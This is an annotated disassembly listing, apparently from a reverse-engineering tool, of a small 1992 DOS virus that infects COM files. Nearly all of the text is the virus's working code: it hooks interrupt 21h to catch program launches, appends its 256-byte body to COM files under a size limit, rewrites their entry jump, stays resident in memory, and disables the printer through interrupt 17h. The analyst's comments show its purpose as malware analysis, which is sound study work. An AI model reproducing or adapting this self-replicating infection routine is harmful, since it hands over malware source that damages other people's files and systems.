                            INT_17H_OFS:                  ;XREF[1]:     1000:0192(*)
Int 17h vecto...                dw          ??
                            INT_17H_SEG:                  ;XREF[1]:     1000:0198(*)
Int 17h vecto...                dw          ??
                            INT_21H_OFS:                  ;XREF[2]:     1000:019e(*),1000:01ab(*)
Int 21h vecto...                dw          ??
                            INT_21H_SEG:                  ;XREF[1]:     1000:01b1(*)
Int 21h vecto...                dw          ??
                            INT_17H_HANDLER:
Virus residen...b400            MOV         AH,0x0                                  ;Disable printer! AH=0 → Success
Virus residen...cf              IRET
                            INT_21H_HANDLER:              ;XREF[1]:     1000:01ab(*)
Virus residen...9c              PUSHF
Virus residen...50              PUSH        AX
Virus residen...53              PUSH        BX
Virus residen...51              PUSH        CX
Virus residen...06              PUSH        ES
Virus residen...57              PUSH        DI
Virus residen...56              PUSH        SI
Virus residen...1e              PUSH        DS
Virus residen...52              PUSH        DX
Virus residen...f7d0            NOT         AX
Virus residen...3dffb4          CMP         AX,NOT_4B00H                            ;Test for execution
Virus residen...7564            JNZ         EXIT_INT_21H
Virus residen...b8023d          MOV         AX,OPEN_FILE_RW_MODE
Virus residen...cd21            INT         0x21                                    ;On success, AX=File handler
Virus residen...8bd8            MOV         BX,AX
Virus residen...bafd00          MOV         DX,HOST_ORIGINAL_ENTRY_BYTES
Virus residen...0e              PUSH        CS
Virus residen...1f              POP         DS
Virus residen...b90300          MOV         CX,0x3
Virus residen...b43f            MOV         AH,READ_FILE
Virus residen...cd21            INT         0x21
Virus residen...813efd004d5a    CMP         word ptr [HOST_O...,EXE_SIGNATURE
Virus residen...7445            JZ          CLOSE_FILE
Virus residen...b80242          MOV         AX,SEEK_TO_FILE_END
Virus residen...33c9            XOR         CX,CX
Virus residen...33d2            XOR         DX,DX
Virus residen...cd21            INT         0x21                                    ;On success, AX=file size
Virus residen...3de7fe          CMP         AX,MAX_INFECTABLE_SIZE
Virus residen...7737            JA          CLOSE_FILE
Virus residen...8bc8            MOV         CX,AX
Virus residen...81e1ff03        AND         CX,0x3ff
Virus residen...81f9e702        CMP         CX,0x2e7                                ;Not clear what this test does; if ((...
Virus residen...772b            JA          CLOSE_FILE
Virus residen...2d0300          SUB         AX,0x3
Virus residen...a3fb00          MOV         [INFECTION_JMP_DISP],AX
Virus residen...2b06fe00        SUB         AX,word ptr [0xfe]                      ;If the jump lands virus_size (0xFE +...
Virus residen...3d0001          CMP         AX,VIRUS_SIZE
Virus residen...741c            JZ          CLOSE_FILE
Virus residen...b440            MOV         AH,0x40
Virus residen...b90001          MOV         CX,0x100
Virus residen...cd21            INT         0x21                                    ;Append the virus body
Virus residen...7213            JC          CLOSE_FILE
Virus residen...b80042          MOV         AX,0x4200
Virus residen...33c9            XOR         CX,CX
Virus residen...33d2            XOR         DX,DX
Virus residen...cd21            INT         0x21                                    ;Seek to file start
Virus residen...b440            MOV         AH,0x40
Virus residen...bafa00          MOV         DX,INFECTED_ENTRY_POINT
Virus residen...b90300          MOV         CX,0x3
Virus residen...cd21            INT         0x21                                    ;Write infected entry point
                            CLOSE_FILE:                   ;XREF[5]:     0020:008a(j),0020:0098(j),0020:00a4(j),0020:00b3(j),
                                                          ;             0020:00bc(j)
Virus residen...b43e            MOV         AH,CLOSE_FILE
Virus residen...cd21            INT         0x21
                            EXIT_INT_21H:                 ;XREF[1]:     0020:006f(j)
Virus residen...5a              POP         DX
Virus residen...1f              POP         DS
Virus residen...5e              POP         SI
Virus residen...5f              POP         DI
Virus residen...07              POP         ES
Virus residen...59              POP         CX
Virus residen...5b              POP         BX
Virus residen...58              POP         AX
Virus residen...9d              POPF
Virus residen...2eff2e0001      JMPF        CS:[ORIG_INT21H_OFS]
Virus residen...286329203...    ds          "(c) 1992 , ",82h,8Ch,98h," ",82h,8Ch...;(c) 1992 , ВМШ ВМиК МГУ (CP866=Russi...
                            INFECTED_ENTRY_POINT:         ;XREF[2,1]:   0020:00a9(*),0020:00c9(*),0020:00a9(*)
Virus residen...e96100          JMP         LAB_0000_035e
                            HOST_ORIGINAL_ENTRY_BYTES:    ;XREF[2]:     0020:0078(*),0020:0084(*)
Virus residen...eb5990          ??[3]
   |_Virus residen...[0]             ??          EBh
   |_Virus residen...[1]             ??          59h    Y
   |_Virus residen...[2]             ??          90h
                            ORIG_INT21H_OFS:              ;XREF[2]:     0020:00de(j),1000:01a9(W)
Virus residen...0000            dw          0h
                            ORIG_INT21H_SEG:              ;XREF[1]:     1000:01aa(W)
Virus residen...0000            dw          0h
                            COM_BASE_ADDRESS:             ;XREF[2]:     1000:0174(*),1000:01bb(*)
Entry point:1...e96100          JMP         Virus in-file section:VIRUS_START
                            VIRUS_START:                  ;XREF[1]:     1000:0100(j)
Virus in-file...51              PUSH        CX
Virus in-file...52              PUSH        DX
Virus in-file...57              PUSH        DI
Virus in-file...56              PUSH        SI
Virus in-file...1e              PUSH        DS
Virus in-file...06              PUSH        ES
Virus in-file...e80000          CALL        GET_DELTA_OFFSET
                            GET_DELTA_OFFSET:             ;XREF[1]:     1000:016a(j)
Virus in-file...5e              POP         SI
Virus in-file...81c6f400        ADD         SI,0xf4
Virus in-file...0e              PUSH        CS
Virus in-file...07              POP         ES
Virus in-file...bf0001          MOV         DI,Entry point:COM_BASE_ADDRESS
Virus in-file...a4              MOVSB       ES:DI,SI
Virus in-file...a5              MOVSW       ES:DI,SI
Virus in-file...b82000          MOV         AX,0x20
Virus in-file...8ec0            MOV         ES,AX
Virus in-file...33ff            XOR         DI,DI
Virus in-file...26803d51        CMP         byte ptr ES:[DI],VIRUS_FIRST_BYTE       ;Memory residence check
Virus in-file...742f            JZ          RETURN_TO_HOST
                            COPY_TO_RESIDENT:
Virus in-file...b90001          MOV         CX,VIRUS_SIZE
Virus in-file...2bf1            SUB         SI,CX
Virus in-file...fc              CLD
Virus in-file...f3a4            MOVSB.REP   ES:DI,SI
Virus in-file...33c0            XOR         AX,AX
Virus in-file...8ed8            MOV         DS,AX
Virus in-file...c7065c005e00    MOV         word ptr [Int 17...,INT_17H_HANDLER     ;= ??
Virus in-file...c7065e002000    MOV         word ptr [Int 17...,RESIDENT_SEG        ;= ??
Virus in-file...be8400          MOV         SI,Int 21h vector:INT_21H_OFS           ;= ??
Virus in-file...b82000          MOV         AX,RESIDENT_SEG
Virus in-file...8ec0            MOV         ES,AX
Virus in-file...bf0001          MOV         DI,VIRUS_SIZE
Virus in-file...a5              MOVSW       ES:DI=>Virus res...,SI
Virus in-file...a5              MOVSW       ES:DI=>Virus res...,SI
Virus in-file...c70684006100    MOV         word ptr [Int 21...,Virus resident in...;= ??
Virus in-file...8c068600        MOV         word ptr [Int 21h vector:INT_21H_SEG],ES;= ??
                            RETURN_TO_HOST:               ;XREF[1]:     1000:0184(j)
Virus in-file...07              POP         ES
Virus in-file...1f              POP         DS
Virus in-file...5e              POP         SI
Virus in-file...5f              POP         DI
Virus in-file...5a              POP         DX
Virus in-file...59              POP         CX
Virus in-file...b80001          MOV         AX,Entry point:COM_BASE_ADDRESS
Virus in-file...50              PUSH        AX
Virus in-file...33c0            XOR         AX,AX
Virus in-file...c3              RET